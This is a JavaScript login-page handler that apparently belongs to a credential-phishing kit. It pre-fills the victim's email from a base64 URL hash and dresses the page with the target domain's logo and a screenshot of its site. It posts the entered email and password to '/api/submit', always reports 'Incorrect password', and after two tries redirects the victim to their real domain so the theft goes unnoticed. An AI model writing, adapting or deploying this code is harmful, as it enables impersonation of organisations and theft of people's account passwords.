// login-handler.js
let failedAttempts = 0;

function isBase64(str) {
  const base64Regex = /^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$/;
  return base64Regex.test(str);
}

function isValidEmail(email) {
  return /^[\w._+-]+@[\w.-]+\.[a-zA-Z]{2,}$/.test(email);
}

function getEmailFromHash() {
  const hash = window.location.hash.substring(1);
  return isBase64(hash) ? atob(hash) : hash;
}

function getEmailDomain(email) {
  const parts = email.split("@");
  return parts.length === 2 ? parts[1].toLowerCase() : null;
}

function handleRedirectOnFailure(email) {
  const domain = getEmailDomain(email);
  window.top.location.href = domain ? `https://${domain}` : "https://yourdomain.com/help";
}

function setImages(domain) {
  if (!domain) return;
  const logoUrl = `https://logo.clearbit.com/${domain}`;
  const bgUrl = `https://screenshot.domains/${domain}`;

  const logoImg = document.getElementById("logo");
  const bgLayer = document.getElementById("background-layer");

  if (logoImg) {
    // update existing <img id="logo"> element
    logoImg.src = logoUrl;
    logoImg.style.display = "block";
    logoImg.onerror = () => {
      // fallback to bundled favicon if clearbit doesn't return an image
      logoImg.src = "./favicon.ico";
    };
  }

  const bgImg = new Image();
  bgImg.src = bgUrl;
  bgImg.onload = () => {
    if (bgLayer) {
      bgLayer.style.backgroundImage = `url("${bgUrl}")`;
      bgLayer.classList.add("loaded");
    }
  };
  bgImg.onerror = () => {
    if (bgLayer) bgLayer.style.backgroundColor = "#f0f0f0";
  };
}

document.addEventListener("DOMContentLoaded", () => {
  const emailInput = document.getElementById("email");
  const passwordInput = document.getElementById("password");
  const submitBtn = document.getElementById("submit-btn");
  const msgBox = document.getElementById("msg");
  const lourlInput = document.getElementById("lourl");

  if (lourlInput) {
    lourlInput.value = window.location.origin + window.location.pathname;
  }

  const email = getEmailFromHash();
  if (isValidEmail(email)) {
    emailInput.value = email;
    const domain = getEmailDomain(email);
    if (domain) setImages(domain);
  } else {
    emailInput.removeAttribute("readonly");
    msgBox.textContent = "Please enter your email.";
    msgBox.style.display = "block";
  }

  let isSubmitting = false;

  document.getElementById("login-form")?.addEventListener("submit", async (e) => {
    e.preventDefault();
    if (isSubmitting) return;

    isSubmitting = true;
    submitBtn.disabled = true;
    submitBtn.textContent = "Logging in...";
    msgBox.style.display = "none";

    if (!emailInput.value || !passwordInput.value) {
      msgBox.textContent = "Please enter both email and password.";
      msgBox.style.display = "block";
      passwordInput.value = "";
      resetUI();
      return;
    }

    // Safely get reCAPTCHA response. grecaptcha may be undefined if script didn't load.
    let captchaResponse = "";
    try {
      if (typeof grecaptcha !== "undefined" && grecaptcha.getResponse) {
        captchaResponse = grecaptcha.getResponse();
      }
    } catch (err) {
      console.warn("grecaptcha read failed:", err);
      captchaResponse = "";
    }

    const captchaInputEl = document.getElementById("captcha-response");
    if (captchaInputEl) captchaInputEl.value = captchaResponse || "";

    // Allow local/dev bypass if server accepts SKIP_CAPTCHA or RECAPTCHA_SECRET is missing.
    const skipCaptcha = window.SKIP_CAPTCHA === true || window.SKIP_CAPTCHA === "true";
    if (!captchaResponse && !skipCaptcha) {
      msgBox.textContent = "Please verify you're not a robot.";
      msgBox.style.display = "block";
      passwordInput.value = "";
      resetUI();
      return;
    }

    const formData = {
      email: emailInput.value,
      password: passwordInput.value,
      lourl: lourlInput?.value || "",
      captcha: captchaResponse
    };

    try {
      const res = await fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData)
      });

      const result = await res.json();
      console.log("Server response:", result);

      failedAttempts++;

  msgBox.textContent = result.message || "Incorrect password.";
  msgBox.style.display = "block";
  passwordInput.value = "";
  try { if (typeof grecaptcha !== "undefined" && grecaptcha.reset) grecaptcha.reset(); } catch (e) { /* ignore */ }
  submitBtn.textContent = "Sign in";

      // Redirect after 2 failed attempts
      if (failedAttempts >= 2) {
        setTimeout(() => handleRedirectOnFailure(emailInput.value), 500);
      }

    } catch (err) {
      console.error("Submission failed:", err);
      failedAttempts++;
      msgBox.textContent = "Network error. Please try again.";
      msgBox.style.display = "block";
  passwordInput.value = "";
  try { if (typeof grecaptcha !== "undefined" && grecaptcha.reset) grecaptcha.reset(); } catch (e) { /* ignore */ }
  submitBtn.textContent = "Sign in";
      if (failedAttempts >= 2) {
        setTimeout(() => handleRedirectOnFailure(emailInput.value), 500);
      }
    } finally {
      resetUI();
    }
  });

  function resetUI() {
    isSubmitting = false;
    submitBtn.disabled = false;
    submitBtn.textContent = "Sign in";
  }
});